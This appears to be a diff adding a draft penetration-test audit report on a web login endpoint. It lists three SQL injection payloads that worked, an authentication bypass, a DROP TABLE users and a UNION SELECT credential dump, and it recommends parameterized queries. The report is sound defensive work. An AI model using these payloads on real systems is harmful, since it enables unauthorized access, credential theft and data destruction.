@@ -1,0 +1,22 @@
+DATABASE AUDIT REPORT - DRAFT
+==============================
+
+During a penetration test of the web application login endpoint,
+the following SQL injection payloads were found to be effective:
+
+Test Case 1:
+  Input: admin' OR '1'='1
+
+Test Case 2:
+  Input: '; DROP TABLE users; --
+  Result: Table successfully dropped in staging environment.
+
+Test Case 3:
+  Input: 1 UNION SELECT username, password FROM users
+  Result: Full credential dump obtained.
+
+RECOMMENDATION:
+  Use parameterized queries at all times. Never pass raw user
+  input into SQL string concatenation.
+
+END OF REPORT
